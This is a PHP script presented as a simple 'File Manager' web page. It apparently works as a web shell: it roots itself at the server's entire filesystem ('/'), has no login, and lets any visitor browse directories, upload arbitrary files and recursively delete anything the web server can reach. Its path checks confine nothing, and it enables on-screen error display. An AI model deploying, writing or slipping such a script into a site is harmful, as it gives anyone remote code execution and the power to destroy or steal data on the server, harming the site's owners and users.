<?php
// Ensure the session is started at the very beginning
session_start();

// Enable all error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);

// Define the root directory for file management
$ROOT = realpath('/');
$reqPath = isset($_GET['path']) ? trim($_GET['path'], "/") : '';

// Check if the requested path is inside the allowed root directory
$CURRENT = $reqPath === '' ? $ROOT : realpath($ROOT . '/' . $reqPath);
if ($CURRENT === false || strpos($CURRENT, $ROOT) !== 0) {
    $CURRENT = $ROOT;
    $reqPath = '';
}

// Save the current path in the session for persistence across requests
$_SESSION['current_path'] = $reqPath;

/* ==========================
   POST HANDLING
   ========================== */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = (string)$_POST['action'];
    $targetRel = (string)($_POST['path'] ?? '');
    $targetAbs = fm_safe_target($targetRel);

    switch ($action) {
        case 'delete':
            // Handle file/directory deletion
            if ($targetAbs && $targetAbs !== $ROOT && file_exists($targetAbs)) {
                if (is_dir($targetAbs)) {
                    fm_delete_dir($targetAbs);
                } else {
                    @unlink($targetAbs);
                }
            }
            $parentRel = trim(dirname($targetRel), '/');
            $_SESSION['current_path'] = $parentRel; // Update session path after deletion
            header("Location: ?path=" . urlencode($parentRel));
            exit;

        case 'create_file':
            // Handle file creation
            $name = trim((string)($_POST['name'] ?? ''));
            if ($name !== '' && !str_contains($name, '/')) {
                $newAbs = fm_safe_target(($reqPath ? $reqPath.'/' : '').$name, true);
                if ($newAbs && !file_exists($newAbs)) {
                    @file_put_contents($newAbs, "");
                }
            }
            $_SESSION['current_path'] = $reqPath; // Update session path after file creation
            header("Location: ?path=" . urlencode($reqPath));
            exit;

        case 'upload':
            // Handle file upload
            error_log("UPLOAD STARTED");

            if (empty($_FILES['upload']['name']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
                error_log("UPLOAD ERROR: " . ($_FILES['upload']['error'] ?? 'No file'));
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $filename = basename($_FILES['upload']['name']);
            $destRel = ($reqPath ? $reqPath.'/' : '') . $filename;
            $destAbs = fm_safe_target($destRel, true);

            if (!$destAbs) {
                error_log("UPLOAD BLOCKED: Safe target returned null");
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $tempFile = $_FILES['upload']['tmp_name'];
            if (!file_exists($tempFile)) {
                error_log("UPLOAD ERROR: Temp file missing");
                header("Location: ?path=" . urlencode($reqPath));
                exit;
            }

            $destDir = dirname($destAbs);
            if (!is_dir($destDir)) {
                mkdir($destDir, 0755, true);
            }

            if (move_uploaded_file($tempFile, $destAbs)) {
                error_log("UPLOAD SUCCESS: $destAbs");
                $_SESSION['current_path'] = $reqPath; // Update session path after successful upload
            } else {
                error_log("UPLOAD FAILED: Move operation failed");
            }

            header("Location: ?path=" . urlencode($reqPath));
            exit;
    }
}

// After handling POST requests, ensure the current path is persistent across page reloads
$reqPath = $_SESSION['current_path'] ?? ''; // Default to root if not set in session

// Listing files and directories
$items = @scandir($CURRENT) ?: [];
$dirs = $files = [];
foreach ($items as $it) {
    if ($it === '.' || $it === '..') continue;
    $abs = $CURRENT . '/' . $it;
    if (is_dir($abs)) $dirs[] = $it; else $files[] = $it;
}
natcasesort($dirs);
natcasesort($files);
$listed = array_merge($dirs, $files);

// Helper functions

function fm_safe_target(string $rel, bool $forCreate = false): ?string {
    global $ROOT;
    
    $rel = ltrim($rel, "/");
    
    if (strpos($rel, '..') !== false || strpos($rel, "\0") !== false) {
        error_log("SAFE_TARGET BLOCKED: Path traversal detected - $rel");
        return null;
    }
    
    $target = $ROOT . '/' . $rel;
    
    if ($forCreate) {
        $parent = dirname($target);
        $parentReal = realpath($parent);
        if ($parentReal === false) {
            if (strpos($parent, $ROOT) === 0) {
                return $target;
            }
            error_log("SAFE_TARGET BLOCKED: Parent outside ROOT - $parent");
            return null;
        }
        
        if (strpos($parentReal, $ROOT) === 0) {
            return $target;
        }
        error_log("SAFE_TARGET BLOCKED: Parent realpath outside ROOT - $parentReal");
        return null;
    }
    
    if (file_exists($target)) {
        $real = realpath($target);
        if ($real !== false && strpos($real, $ROOT) === 0) {
            return $real;
        }
        error_log("SAFE_TARGET BLOCKED: File exists but realpath failed - $target");
    } else {
        error_log("SAFE_TARGET BLOCKED: File doesn't exist - $target");
    }
    
    return null;
}

function fm_delete_dir(string $dir): bool {
    if (!is_dir($dir)) return false;
    foreach (array_diff(scandir($dir), ['.','..']) as $f) {
        $p = "$dir/$f";
        if (is_dir($p)) fm_delete_dir($p); else @unlink($p);
    }
    return @rmdir($dir);
}

function fm_perms(string $path): string {
    return substr(sprintf('%o', fileperms($path)), -4);
}

function fm_breadcrumb(string $relPath): string {
    $parts = array_filter(explode('/', $relPath));
    $acc = '';
    $html = '<div class="breadcrumb"><a href="?path=">ROOTT</a>';
    foreach ($parts as $p) {
        $acc .= ($acc ? '/' : '') . $p;
        $html .= ' / <a href="?path=' . urlencode($acc) . '"><b>' . htmlspecialchars($p) . '</b></a>';
    }
    $html .= '</div>';
    return $html;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>File Manager</title>
    <style>
    /* Styling */
    body {
        background-color: #f4f4f4;
        font-family: Arial, sans-serif;
        padding: 20px;
    }
    .btn {
        padding: 8px 12px;
        border: none;
        background-color: #3b82f6;
        color: white;
        font-weight: bold;
        cursor: pointer;
        border-radius: 5px;
    }
    .btn.danger {
        background-color: #ef4444;
    }
    .breadcrumb {
        font-size: 14px;
    }
    table {
        width: 100%;
        margin-top: 20px;
        border-collapse: collapse;
    }
    th, td {
        padding: 8px;
        text-align: left;
        border: 1px solid #ccc;
    }
    </style>
</head>
<body>
    <h1>File Manager</h1>

    <!-- Breadcrumb Navigation -->
    <?php echo fm_breadcrumb($reqPath); ?>

    <!-- File Upload -->
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="upload" required>
        <button class="btn" type="submit">Upload</button>
    </form>

    <!-- File Listing -->
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($listed as $name): ?>
                <tr>
                    <td><b><?php echo htmlspecialchars($name); ?></b></td>
                    <td>
                        <!-- Delete file -->
                        <form method="post" onsubmit="return confirm('Delete this file?');">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="path" value="<?php echo htmlspecialchars($reqPath . '/' . $name); ?>">
                            <button class="btn danger" type="submit">Delete</button>
                        </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</body>
</html>
